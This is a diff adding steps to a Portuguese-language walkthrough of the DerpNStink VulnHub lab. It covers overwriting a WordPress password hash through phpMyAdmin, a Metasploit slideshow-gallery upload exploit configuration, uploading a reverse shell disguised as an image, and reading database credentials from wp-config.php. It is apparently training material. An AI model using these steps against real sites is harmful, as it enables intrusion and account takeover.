@@ -117,6 +117,36 @@ Tentamos verificar se a versão do **phpmyadmin** é vulnerável, mas não conse
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/myadmin2.png)
 
+O que conseguimos de interessante, dentro das databases conseguimos ver os usuários e os hashes deles, e consequentemente podemos fazer a alteração da senha deles também... que é o caso que vamos fazer aqui para exemplificar isso
+
+Aqui acessamos o local onde as senhas estão salvas no wordpress (database)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/senha.png)
+
+#### Alterar senha
+
+Vamos colocar a senha dele como **senha**, como sabemos que ém php, devemos gerar uma tal
+
+**echo password_hash('senha',PASSWORD_DEFAULT);**
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/senha1.png)
+
+Jogamos lá
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/senha2.png)
+
+Senha alterada
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/senha3.png)
+
+Agora tentamos logar no wordpress com as credenciais trocadas
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/senha4.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/senha5.png)
+
+Sim, nós ainda "não descobrimos" o wordpress, fiz aqui apenas como algo a mais para exploração, agora vamos prosseguir na enumeração antes de ganhar o reverse shell na máquina (que daria pra fazer aqui direto já)
+
 ### /temporary/
 
 Acessamos, e deu acesso 'try harder'
@@ -221,10 +251,84 @@ Primeiro modo que vou fazer é através de um exploit já pronto
 
 Pesquisamos por exploits pra ele, e encontramos
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/saerch.png)
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/search.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/search1.png)
 
 Copiamos ele para nossa pasta de trabalho
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/search.png)
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/search2.png)
 
+Bom, agora copiamos o reverse shell que será adicionado lá, lembrando de trocar o ip e a porta
 
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/search3.png)
+
+Agora fazemos o upload dele
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/search4.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/search5.png)
+
+Agora pegamos o reverse shell 
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/search6.png)
+
+## Metasploit Framework
+
+Utilizamos o módulo para exploração
+
+```bash
+use exploit/unix/webapp/wp_slideshowgallery_upload
+set rhosts derpnstink.local
+set lhost 192.168.56.102
+set wp_user admin
+set wp_password admin
+set target 0
+set targeturi /weblog/
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/mao.png)
+
+## Manual
+
+Vamos fazer agora de forma manual
+
+Após logarmos vamos na aba de **Add New**
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/manual2.png)
+
+Modificamos as configurações a adicionamos nosso reverse shell
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/manual1.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/manual.png)
+
+Adicionado
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/manual3.png)
+
+Agora abrimos ele e ganhamos a reverse shell
+
+Clicamos na foto que foi adicionada (na verdade é um reverse shell)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/manual4.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/manual5.png)
+
+Vamos iniciar a escalação de privilégio
+
+# www-data -> Root
+
+Encontramos a senha do banco da dados dentro do **/var/www/html/weblog/wp-config.php**
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/db1.png)
+
+Logamos no mysql
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/db.png)
+
+Lembrando, iremos encontrar as mesmas databases que encontramos no phpmyadmin
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/senha.png)
+
+Aqui eu troquei a senha do usuário,
